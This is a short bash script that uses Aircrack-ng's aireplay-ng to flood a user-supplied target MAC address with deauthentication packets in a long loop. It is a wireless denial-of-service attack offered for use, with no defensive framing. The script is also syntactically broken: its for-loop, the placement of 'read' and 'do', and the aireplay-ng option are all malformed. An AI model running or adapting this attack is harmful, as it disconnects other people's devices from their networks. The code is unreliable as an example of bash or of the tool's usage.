#!/bin/bash
# run on a Linux machine with Aircrack-NG installed. 

for i in (1..10000)

echo -n "Enter target MAC address: "
read mac
do
    aireplay-ng deauth 1000 -a $mac wlan0mon
    sleep 60s

done